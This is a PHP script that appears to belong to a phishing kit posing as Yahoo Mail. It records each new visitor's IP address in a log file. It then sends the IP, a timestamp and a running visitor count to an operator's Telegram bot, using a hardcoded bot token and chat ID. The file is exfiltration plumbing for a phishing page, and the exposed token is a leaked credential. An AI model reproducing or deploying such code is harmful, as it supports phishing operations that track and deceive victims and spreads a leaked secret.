<?php
$botToken = "7693511765:AAGLclLGxxL0DeNVkkEiJme1rYZGV8cEzgY";
$chatId = "1265129175";

$ip = $_SERVER['REMOTE_ADDR'];
$logFile = "ip_log.txt";

// Read IPs
$ips = file_exists($logFile) ? file($logFile, FILE_IGNORE_NEW_LINES) : [];

if (!in_array($ip, $ips)) {
    file_put_contents($logFile, $ip . PHP_EOL, FILE_APPEND);
    $visitorCount = count($ips) + 1;

    $message = "👤 New YAHOO MAIL visitor!\nIP: $ip\nTime: " . date("Y-m-d H:i:s") . "\n📊 Total Visitors: $visitorCount";

    // Telegram API
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
?>
